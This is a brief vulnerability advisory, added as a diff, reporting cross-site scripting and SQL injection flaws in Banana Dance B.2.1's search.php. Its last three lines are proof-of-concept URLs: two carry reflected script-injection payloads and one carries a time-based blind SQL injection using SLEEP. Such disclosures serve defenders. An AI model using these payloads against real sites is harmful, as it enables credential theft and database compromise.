@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/55153/info
+
+Banana Dance is prone to cross-site-scripting and SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Banana Dance B.2.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/search.php?q=q='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000174)%3C/script%3E&category=3
+http://www.example.com/search.php?q=q='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x00017B)%3C/script%3E&category=3
+http://www.example.com/search.php?q=234&category=-111%27)%20OR%20SLEEP(25)=0%20LIMIT%201--+ 
